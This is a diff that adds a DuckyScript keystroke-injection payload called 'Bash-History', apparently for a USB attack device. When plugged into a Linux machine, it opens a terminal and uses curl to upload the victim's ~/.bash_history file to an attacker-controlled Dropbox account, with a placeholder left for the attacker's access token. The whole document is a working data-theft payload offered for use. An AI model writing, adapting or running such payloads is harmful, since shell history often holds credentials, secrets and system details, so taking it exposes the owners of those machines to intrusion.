@@ -1,0 +1,30 @@
+REM Title: Bash-History
+REM Author: Zoe Ronen
+REM Description: This payload is meant to exfiltrate bash history to a dropbox
+REM Target: Linux
+
+DELAY 500
+INJECT_MOD WINDOWS
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 500
+STRING cd $HOME
+DELAY 500
+ENTER
+DELAY 500
+STRING curl -X POST https://content.dropboxapi.com/2/files/upload
+SPACE
+REM replace the [DROPBOX_ACCESS_TOKEN] placeholder with your actual Dropbox access token
+STRING --header "Authorization: Bea[DROPBOX_ACCESS_TOKEN]"
+SPACE
+STRING --header "Dropbox-API-Arg: {\"path\": \"/home/$USER/.bash_history\"}"
+SPACE
+STRING --header "Content-Type: application/octet-stream" --data-binary @.bash_history
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 500
+ENTER
